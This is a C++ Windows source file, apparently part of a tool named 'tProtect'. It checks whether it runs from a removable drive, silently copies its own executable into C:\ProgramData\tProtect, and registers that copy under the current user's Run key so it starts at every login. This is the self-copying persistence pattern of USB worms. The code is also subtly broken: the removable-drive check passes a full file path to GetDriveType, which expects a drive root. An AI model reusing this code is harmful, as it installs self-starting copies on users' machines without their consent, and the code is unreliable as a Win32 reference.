#include <iostream>
#include <Windows.h>
#include <comdef.h>

#include "SelfAlive.h"

bool isRemovableDevice()
{
    // 获取当前模块的文件名
    TCHAR moduleName[MAX_PATH];
    GetModuleFileName(NULL, moduleName, MAX_PATH);

    // 获取当前模块所在的驱动器类型
    UINT driveType = GetDriveType(moduleName);

    // 判断驱动器类型是否为可移动设备
    return driveType == DRIVE_REMOVABLE;
}

bool copySelfToDirectory()
{
    // 获取当前模块的文件名
    TCHAR moduleName[MAX_PATH];
    GetModuleFileName(NULL, moduleName, MAX_PATH);

    try {
        if (!dirExists("C:\\ProgramData\\tProtect")) {
            CreateDirectory(L"C:\\ProgramData\\tProtect", NULL);
        }
        std::string _t = "C:\\ProgramData\\tProtect\\tProtect.exe";
        _bstr_t __t(_t.c_str());
        LPCTSTR path = (LPCTSTR)__t;
        if (fileExists(path)) {
            DeleteFile(path);
        }
        // 构造目标路径
        std::wstring destination = L"C:\\ProgramData\\tProtect\\tProtect.exe";

        return CopyFile(moduleName, destination.c_str(), FALSE);
    }
    catch (const std::exception& e) {
        return false;
    }
}

std::string getWorkingPath()
{
    // 获取当前模块的文件名
    TCHAR moduleName[MAX_PATH];
    GetModuleFileName(NULL, moduleName, MAX_PATH);

    // 获取当前模块所在的目录
    std::wstring currentDirectory = moduleName;
    size_t lastSlashIndex = currentDirectory.find_last_of(L"\\");
    std::wstring directoryW = currentDirectory.substr(0, lastSlashIndex);
    std::string directory(directoryW.begin(), directoryW.end());
    return directory;
}

bool selfStart() {
    HKEY hKey;
    LPCWSTR lpSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    LPCWSTR lpValueName = L"tProtect";
    LPCWSTR lpValue = L"C:\\ProgramData\\tProtect\\tProtect.exe";

    bool result = false;
    // 打开注册表项
    if (RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        // 设置注册表项的值
        
        if (RegSetValueEx(hKey, lpValueName, 0, REG_SZ, (LPBYTE)lpValue, wcslen(lpValue) * sizeof(WCHAR)) == ERROR_SUCCESS)
        {
            result = true;
        }
        RegCloseKey(hKey);
    }

    return result;
}

bool dirExists(const std::string& dirName_in)
{
    DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
    if (ftyp == INVALID_FILE_ATTRIBUTES)
        return false;  //something is wrong with your path!

    if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
        return true;   // this is a directory!

    return false;    // this is not a directory!
}
bool fileExists(LPCTSTR lpFileName) {
    WIN32_FIND_DATA fd = { 0 };
    HANDLE hFind = FindFirstFile(lpFileName, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        FindClose(hFind);
    }
    return ((hFind != INVALID_HANDLE_VALUE) && !(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY));
}